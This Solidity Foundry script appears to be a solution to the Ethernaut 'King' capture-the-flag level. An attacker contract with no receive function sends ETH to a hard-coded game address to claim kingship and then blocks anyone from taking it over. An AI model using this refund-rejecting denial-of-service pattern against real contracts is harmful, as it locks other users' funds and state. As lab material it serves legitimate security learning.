// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
contract KingAttack {
    
    constructor() payable {}
    
    function attack(address payable kingAddress) external {
        // Become king by sending all our ETH
        (bool success,) = kingAddress.call{value: address(this).balance}("");
        require(success, "Attack failed");
    }
}

contract KingSolution is Script {
    function run() external {
        address payable kingAddress = payable(0xDfe7fbFBEE2C397E37b320B6A98D9E8008Ce564E);
        
        vm.startBroadcast();
        
        KingAttack attacker = new KingAttack{value: 0.002 ether}();
        attacker.attack(kingAddress);
        
        vm.stopBroadcast();
    }
}
